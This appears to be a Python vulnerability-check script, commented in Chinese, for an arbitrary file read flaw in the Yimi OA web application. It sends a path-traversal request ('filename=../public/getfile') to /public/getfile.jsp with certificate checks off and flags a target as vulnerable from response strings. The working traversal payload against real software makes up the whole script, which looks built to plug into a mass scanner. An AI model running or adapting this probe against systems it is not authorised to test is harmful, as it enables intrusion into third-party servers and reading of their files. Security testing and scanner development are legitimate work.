#一米OA任意文件读取漏洞
import requests, threading
from termcolor import colored
requests.packages.urllib3.disable_warnings()  #忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url +'/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp', verify=False,timeout=20)
        if 'filePath=' in response.text or '警告非法用户，你无访问此页的权限！' in response.text:
            print(colored('[+]存在一米OA任意文件读取漏洞', 'red'))
            results = f'{urls}-->存在一米OA任意文件读取漏洞'
        else:
            print('[-]不存在一米OA任意文件读取漏洞')
    except:
        print('[-]不存在一米OA任意文件读取漏洞')


def yimiOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln,args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results